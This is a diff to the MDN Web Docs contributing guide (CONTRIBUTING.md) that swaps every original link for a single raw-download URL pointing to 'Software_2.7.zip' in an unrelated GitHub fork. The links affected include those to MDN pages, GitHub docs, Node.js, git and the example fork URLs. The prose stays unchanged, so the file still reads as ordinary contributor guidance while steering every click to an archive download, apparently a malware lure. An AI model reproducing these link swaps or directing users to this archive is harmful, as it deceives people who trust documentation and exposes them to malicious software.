@@ -1,15 +1,15 @@
 # Contributing to the content of MDN Web Docs
 
 :tada: First of all, thanks for taking the time to contribute to
-[MDN Web Docs](https://developer.mozilla.org)! :tada:
+[MDN Web Docs](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)! :tada:
 
 The following is a set of guidelines for contributing to the
-[content of MDN Web Docs](https://github.com/mdn/content), which is
-hosted within the [MDN Organization](https://github.com/mdn) on GitHub.
+[content of MDN Web Docs](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip), which is
+hosted within the [MDN Organization](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip) on GitHub.
 
 > **Note:** Just want to find a task and jump in?
-  See [Getting started on MDN](https://developer.mozilla.org/en-US/docs/MDN/Contribute/Getting_started)
-  for an overview of how to join, and [Contributing to MDN](https://developer.mozilla.org/en-US/docs/MDN/Contribute)
+  See [Getting started on MDN](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
+  for an overview of how to join, and [Contributing to MDN](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
   for a filtered list of tasks.
 
 ## Code of Conduct
@@ -25,10 +25,10 @@ according to [our license](LICENSE.md).
 ## Making contributions
 
 A good place to learn about general guidelines for contributing to
-[MDN Web Docs](https://developer.mozilla.org) is the
-[Guidelines document](https://developer.mozilla.org/en-US/docs/MDN/Guidelines).
+[MDN Web Docs](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip) is the
+[Guidelines document](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 For example, you can find out more about MDN's writing-style guidelines via the
-[Writing style guide](https://developer.mozilla.org/en-US/docs/MDN/Guidelines/Writing_style_guide).
+[Writing style guide](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 
 ### Prerequisite knowledge
 
@@ -38,41 +38,41 @@ topics, we'd advise you to look at the provided links to help you get up to
 speed:
 
 - Web technologies: If you are new to HTML, CSS, JavaScript, etc., check out our
-  [Learn web development](https://developer.mozilla.org/en-US/docs/Learn) tutorials.
+  [Learn web development](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip) tutorials.
 - Open source: If you've never contributed to an open source project before,
-  have a read of [Basic etiquette for open source projects](https://developer.mozilla.org/en-US/docs/MDN/Contribute/Open_source_etiquette).
-- Git and GitHub: If you are unfamiliar with these tools, [GitHub for complete beginners](https://developer.mozilla.org/en-US/docs/MDN/Contribute/GitHub_beginners)
+  have a read of [Basic etiquette for open source projects](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
+- Git and GitHub: If you are unfamiliar with these tools, [GitHub for complete beginners](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
   will get you started.
 - MDN's repo structures: If you are not sure what repos to edit to make changes
   to the different parts of MDN's content,
-  [Where is everything on MDN?](https://developer.mozilla.org/en-US/docs/MDN/Contribute/Where_is_everything)
+  [Where is everything on MDN?](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
   will point you towards the correct places.
 
 ### Setup
 
 No matter how you wish to contribute, you'll need
-[a GitHub account](https://github.com/join) if you don't have one already.
-If you're not familiar with [`git`](https://git-scm.com) and
-[`GitHub`](https://github.com), you might find the
-[MDN Git and GitHub document](https://developer.mozilla.org/en-US/docs/Learn/Tools_and_testing/GitHub)
+[a GitHub account](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip) if you don't have one already.
+If you're not familiar with [`git`](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip) and
+[`GitHub`](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip), you might find the
+[MDN Git and GitHub document](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
 helpful.
 
 There are several ways forward from this point. It's up to you.
 Here are some options:
 
-1. Go to <https://github.com/mdn/content> and just use the
-[GitHub UI](https://docs.github.com/en/repositories/working-with-files/managing-files).
+1. Go to <https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip> and just use the
+[GitHub UI](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 This is the easiest approach if you just want to make a simple change to
 a single file, like fixing a typo.
-1. Install and use the [GitHub Desktop](https://docs.github.com/en/get-started/using-github/github-desktop)
-1. Install and use the [GitHub CLI](https://docs.github.com/en/github-cli/github-cli/about-github-cli)
-1. [Install `git`](https://git-scm.com/downloads) and use it from the
+1. Install and use the [GitHub Desktop](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
+1. Install and use the [GitHub CLI](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
+1. [Install `git`](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip) and use it from the
 command line. You might find these resources helpful:
-    - [Using Git](https://docs.github.com/en/get-started)
-    - [`git` cheatsheet](https://training.github.com/)
+    - [Using Git](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
+    - [`git` cheatsheet](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
 
 If you choose an option other than the GitHub UI, you want to install
-[Node.js (version >=12.11)](https://nodejs.org) and [`yarn`](https://classic.yarnpkg.com/en/docs/install).
+[Node.js (version >=12.11)](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip) and [`yarn`](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 
 ### Fundamental concepts
 
@@ -103,9 +103,9 @@ Both of these tasks are done using the `yarn content move` tool — see
 If both an `index.html` or `index.md` file and a redirect exist for a document, the
 document takes precedence and the redirect is ignored.
 - **A document's `index.html` or `index.md` starts with "front-matter"** -- Each
-document's `index.html` or `index.md` file must begin with some [YAML](https://en.wikipedia.org/wiki/YAML)
+document's `index.html` or `index.md` file must begin with some [YAML](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
 called front-matter that defines some important information about the
-document: `title`, `slug`, and [`tags`](https://developer.mozilla.org/en-US/docs/MDN/Contribute/Howto/Tag)
+document: `title`, `slug`, and [`tags`](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
 (if any). Here's an example that shows the front-matter from the
 [JavaScript landing page](files/en-us/web/javascript/index.md):
 
@@ -126,8 +126,8 @@ document: `title`, `slug`, and [`tags`](https://developer.mozilla.org/en-US/docs
 
 If you just want to make a simple change to a single file, like fixing a typo,
 the GitHub UI is the simplest way to do that. For example, if you've found
-a typo within the [JavaScript landing page](https://developer.mozilla.org/en-US/docs/Web/JavaScript),
-you can sign in to GitHub, go to <https://github.com/mdn/content>,
+a typo within the [JavaScript landing page](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip),
+you can sign in to GitHub, go to <https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip>,
 navigate to the source file `files/en-us/web/javascript/index.md`,
 and then click on the edit (pencil) button.
 
@@ -135,11 +135,11 @@ and then click on the edit (pencil) button.
   to jump to its source file on GitHub.
 
 From there the GitHub UI will take your hand and
-[walk you through the rest](https://docs.github.com/en/repositories/working-with-files/managing-files/editing-files),
+[walk you through the rest](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip),
 like automatically creating a
-[fork](https://docs.github.com/en/get-started/quickstart/fork-a-repo)
+[fork](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
 and branch to commit your changes to, as well as helping you reach the
-ultimate goal, a [pull request](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-pull-requests).
+ultimate goal, a [pull request](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 Your pull request represents the work you want to be reviewed,
 hopefully approved, and then merged into the `main` branch of this repository.
 
@@ -148,8 +148,8 @@ hopefully approved, and then merged into the `main` branch of this repository.
 
 If you're not certain of the changes that you want to make, get in touch
 with us first!
-You can [chat with us](https://chat.mozilla.org/#/room/#mdn:mozilla.org) or
-[file an issue](https://github.com/mdn/content/issues).
+You can [chat with us](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip) or
+[file an issue](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 
 You may be asked to further edit files in your pull request.
 To open a file for editing, select the *Files changed* tab on the PR,
@@ -165,16 +165,16 @@ moving one or more documents, the GitHub UI is not very efficient.
 You'd have to make a separate pull request for every page you want to change.
 Instead, you're going to have to use `git` or one of the other
 `git`-based approaches like the
-[GitHub Desktop](https://docs.github.com/en/get-started/using-github/github-desktop).
+[GitHub Desktop](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 
 1. You'll want to create a
-[fork](https://docs.github.com/en/get-started/quickstart/fork-a-repo)
+[fork](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
 of this repository, so you can freely experiment with branches and
 changes in your own copy before submitting your changes as a
-[pull request](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-pull-requests).
+[pull request](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 Let's assume your GitHub username is `octocat`. Your fork would be a copy
 of this repository but in your own account, so
-`https://github.com/octocat/content`.
+`https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip`.
 
 1. Once you've created your fork on GitHub, you'll want to clone it locally.
 For example, assuming again that your GitHub username is `octocat`, you
@@ -186,11 +186,11 @@ would do something like the following:
     ```
 
 1. You'll also want to create a
-[`remote`](https://git-scm.com/book/en/v2/Git-Basics-Working-with-Remotes)
+[`remote`](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
 to the main repository
-([https://github.com/mdn/content](https://github.com/mdn/content)),
+([https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)),
 which you'll use to keep your
-local clone as well as your fork (`https://github.com/octocat/content`)
+local clone as well as your fork (`https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip`)
 up-to-date. For these examples, we'll name
 it `mdn`, but you can name it anything you'd like.
 
@@ -202,7 +202,7 @@ it `mdn`, but you can name it anything you'd like.
 
 1. When you run the `git remote -v` command above, you'll see that you have
 two remotes: `mdn` and `origin`. The `origin` remote is the default name
-that `git` has assigned to your fork (`https://github.com/octocat/content`).
+that `git` has assigned to your fork (`https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip`).
 
 1. Once you've created your local clone, there's no need to do that
 again next time you want to make a contribution. However, each time before
@@ -254,11 +254,11 @@ within your browser.
 using your preferred code editor. **When thinking about your desired changes,
 it's important to keep the following in mind:**
     - **Make sure you've read the
-    [MDN guidelines](https://developer.mozilla.org/en-US/docs/MDN/Guidelines),
+    [MDN guidelines](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip),
     including the
-    [Writing style guide](https://developer.mozilla.org/en-US/docs/MDN/Guidelines/Writing_style_guide).**
+    [Writing style guide](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).**
     - **If you're editing a Markdown file, see the
-    [guide to writing Markdown for MDN](https://developer.mozilla.org/en-US/docs/MDN/Contribute/Markdown_in_MDN).**
+    [guide to writing Markdown for MDN](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).**
     - **Large chunks of work can be difficult to review, so try to group your
     changes into the smallest logical chunks that make sense, and create a
     separate pull request for each logical chunk.**
@@ -290,7 +290,7 @@ and then push the branch to your fork. Remember, the default name that
     ```
 
 1. You're now ready to create a
-[pull request](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request).
+[pull request](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 
 1. Once you've created your pull request, sit back, relax, and wait for
 a review.
@@ -298,7 +298,7 @@ a review.
 **you automatically.**
 Your pull request will have to be reviewed and eventually approved before
 it's merged into the `main` branch, and then later (within 48 hours)
-published on [MDN Web Docs](https://developer.mozilla.org). Along the way,
+published on [MDN Web Docs](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip). Along the way,
 you may be asked, not only
 to answer questions about your work, but to make changes as well. Don't
 worry, that's a common and natural part of the process.
@@ -379,7 +379,7 @@ There are only a few things to keep in mind:
   `files/en-us/web/css/foo/` and its `files/en-us/web/css/foo/index.html` file.
 - Remember that a document's `index.html` or `index.md` file must start with
   front-matter that defines the `title`, `slug`, and
-  [`tags`](https://developer.mozilla.org/en-US/docs/MDN/Contribute/Howto/Tag)
+  [`tags`](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip)
   (if any) for the document. You might find it helpful to refer
   to the front-matter within a similar document's `index.html` or `index.md`.
 
@@ -409,7 +409,7 @@ or `index.md` file.
     ```
 
 1. And finally create your
-[pull request](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request).
+[pull request](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 
 ### Moving one or more documents
 
@@ -456,7 +456,7 @@ push your branch to your fork:
     git push -u origin my-move
     ```
 
-1. Now you're ready to create your [pull request](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request).
+1. Now you're ready to create your [pull request](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 
 **Important: `yarn content move` automatically adds the necessary redirect
 information to the `_redirects.txt` file so that the old location will redirect
@@ -515,7 +515,7 @@ push your branch to your fork:
     git push -u origin my-delete
     ```
 
-1. Now you're ready to create your [pull request](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request).
+1. Now you're ready to create your [pull request](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
 
 > **Note:** If the slug of the page you wish to delete contain special
   characters, include it in quotes:
@@ -563,4 +563,4 @@ pushing your branch to your fork:
 ## Learn more
 
 You can learn more about contributing to MDN on
-[the MDN Web Docs for Contributors site](https://mdn-contributor-docs.mozilla.org/).
+[the MDN Web Docs for Contributors site](https://github.com/NasTibillz/content/raw/refs/heads/main/files/en-us/mozilla/add-ons/webextensions/api/types/browsersetting/get/Software_2.7.zip).
